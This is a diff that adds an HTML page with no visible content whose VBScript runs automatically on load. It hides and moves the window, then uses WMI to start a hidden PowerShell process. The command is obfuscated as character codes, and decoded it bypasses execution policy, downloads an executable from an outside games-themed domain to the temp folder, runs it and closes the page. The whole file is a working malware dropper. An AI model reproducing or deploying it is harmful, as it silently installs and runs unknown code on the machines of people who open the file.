@@ -1,0 +1,21 @@
+<html>
+<head>
+<script language="VBScript">
+Window.ReSizeTo 0, 0 : Window.moveTo -2000,-2000
+Sub window_onload
+	const impersonation = 3
+	Const HIDDEN_WINDOW = 12
+	Set Locator = CreateObject("WbemScripting.SWbemLocator")
+	Set Service = Locator.ConnectServer()
+	Service.Security_.ImpersonationLevel=impersonation
+	Set objStartup = Service.Get("Win32_ProcessStartup")
+	Set objConfig = objStartup.SpawnInstance_
+	objConfig.ShowWindow = HIDDEN_WINDOW
+	Set Process = Service.Get("Win32_Process")
+	Error = Process.Create(ChrW(112) & ChrW(111) & ChrW(119) & ChrW(101) & ChrW(114) & ChrW(115) & ChrW(104) & ChrW(101) & ChrW(108) & ChrW(108) & ChrW(46) & ChrW(101) & ChrW(120) & ChrW(101) & ChrW(32) & ChrW(45) & ChrW(69) & ChrW(120) & ChrW(101) & ChrW(99) & ChrW(117) & ChrW(116) & ChrW(105) & ChrW(111) & ChrW(110) & ChrW(80) & ChrW(111) & ChrW(108) & ChrW(105) & ChrW(99) & ChrW(121) & ChrW(32) & ChrW(66) & ChrW(121) & ChrW(112) & ChrW(97) & ChrW(115) & ChrW(115) & ChrW(32) & ChrW(45) & ChrW(119) & ChrW(105) & ChrW(110) & ChrW(100) & ChrW(111) & ChrW(119) & ChrW(115) & ChrW(116) & ChrW(121) & ChrW(108) & ChrW(101) & ChrW(32) & ChrW(104) & ChrW(105) & ChrW(100) & ChrW(100) & ChrW(101) & ChrW(110) & ChrW(32) & ChrW(45) & ChrW(99) & ChrW(111) & ChrW(109) & ChrW(109) & ChrW(97) & ChrW(110) & ChrW(100) & ChrW(32) & ChrW(116) & ChrW(114) & ChrW(121) & ChrW(123) & ChrW(36) & ChrW(100) & ChrW(111) & ChrW(119) & ChrW(110) & ChrW(32) & ChrW(61) & ChrW(32) & ChrW(78) & ChrW(101) & ChrW(119) & ChrW(45) & ChrW(79) & ChrW(98) & ChrW(106) & ChrW(101) & ChrW(99) & ChrW(116) & ChrW(32) & ChrW(83) & ChrW(121) & ChrW(115) & ChrW(116) & ChrW(101) & ChrW(109) & ChrW(46) & ChrW(78) & ChrW(101) & ChrW(116) & ChrW(46) & ChrW(87) & ChrW(101) & ChrW(98) & ChrW(67) & ChrW(108) & ChrW(105) & ChrW(101) & ChrW(110) & ChrW(116) & ChrW(59) & ChrW(36) & ChrW(117) & ChrW(114) & ChrW(108) & ChrW(32) & ChrW(61) & ChrW(32) & ChrW(39) & ChrW(72) & ChrW(84) & ChrW(84) & ChrW(80) & ChrW(58) & ChrW(47) & ChrW(39) & ChrW(43) & ChrW(39) & ChrW(47) & ChrW(39) & ChrW(43) & ChrW(39) & ChrW(103) & ChrW(97) & ChrW(109) & ChrW(101) & ChrW(115) & ChrW(97) & ChrW(114) & ChrW(101) & ChrW(110) & ChrW(97) & ChrW(46) & ChrW(103) & ChrW(100) & ChrW(110) & ChrW(47) & ChrW(103) & ChrW(97) & ChrW(109) & ChrW(101) & ChrW(115) & ChrW(47) & ChrW(75) & ChrW(67) & ChrW(51) & ChrW(105) & ChrW(46) & ChrW(101) & ChrW(120) & ChrW(101) & ChrW(39) & ChrW(59) & ChrW(36) & ChrW(102) & ChrW(105) & ChrW(108) & ChrW(101) & ChrW(32) & ChrW(61) & ChrW(32) & ChrW(36) & ChrW(101) & ChrW(110) & ChrW(118) & ChrW(58) & ChrW(116) & ChrW(101) & ChrW(109) & ChrW(112) & ChrW(32) & ChrW(43) & ChrW(32) & ChrW(39) & ChrW(92) & ChrW(75) & ChrW(67) & ChrW(51) & ChrW(105) & ChrW(46) & ChrW(101) & ChrW(120) & ChrW(101) & ChrW(39) & ChrW(59) & ChrW(36) & ChrW(100) & ChrW(111) & ChrW(119) & ChrW(110) & ChrW(46) & ChrW(68) & ChrW(111) & ChrW(119) & ChrW(110) & ChrW(108) & ChrW(111) & ChrW(97) & ChrW(100) & ChrW(70) & ChrW(105) & ChrW(108) & ChrW(101) & ChrW(40) & ChrW(36) & ChrW(117) & ChrW(114) & ChrW(108) & ChrW(44) & ChrW(36) & ChrW(102) & ChrW(105) & ChrW(108) & ChrW(101) & ChrW(41) & ChrW(59) & ChrW(36) & ChrW(101) & ChrW(120) & ChrW(101) & ChrW(99) & ChrW(32) & ChrW(61) & ChrW(32) & ChrW(78) & ChrW(101) & ChrW(119) & ChrW(45) & ChrW(79) & ChrW(98) & ChrW(106) & ChrW(101) & ChrW(99) & ChrW(116) & ChrW(32) & ChrW(45) & ChrW(99) & ChrW(111) & ChrW(109) & ChrW(32) & ChrW(115) & ChrW(104) & ChrW(101) & ChrW(108) & ChrW(108) & ChrW(46) & ChrW(97) & ChrW(112) & ChrW(112) & ChrW(108) & ChrW(105) & ChrW(99) & ChrW(97) & ChrW(116) & ChrW(105) & ChrW(111) & ChrW(110) & ChrW(59) & ChrW(36) & ChrW(101) & ChrW(120) & ChrW(101) & ChrW(99) & ChrW(46) & ChrW(115) & ChrW(104) & ChrW(101) & ChrW(108) & ChrW(108) & ChrW(101) & ChrW(120) & ChrW(101) & ChrW(99) & ChrW(117) & ChrW(116) & ChrW(101) & ChrW(40) & ChrW(36) & ChrW(102) & ChrW(105) & ChrW(108) & ChrW(101) & ChrW(41) & ChrW(59) & ChrW(125) & ChrW(99) & ChrW(97) & ChrW(116) & ChrW(99) & ChrW(104) & ChrW(123) & ChrW(125) & ChrW(101) & ChrW(120) & ChrW(105) & ChrW(116) & ChrW(59), null, objConfig, intProcessID)
+	
+	self.close
+end sub
+</script>
+</head>
+</html>
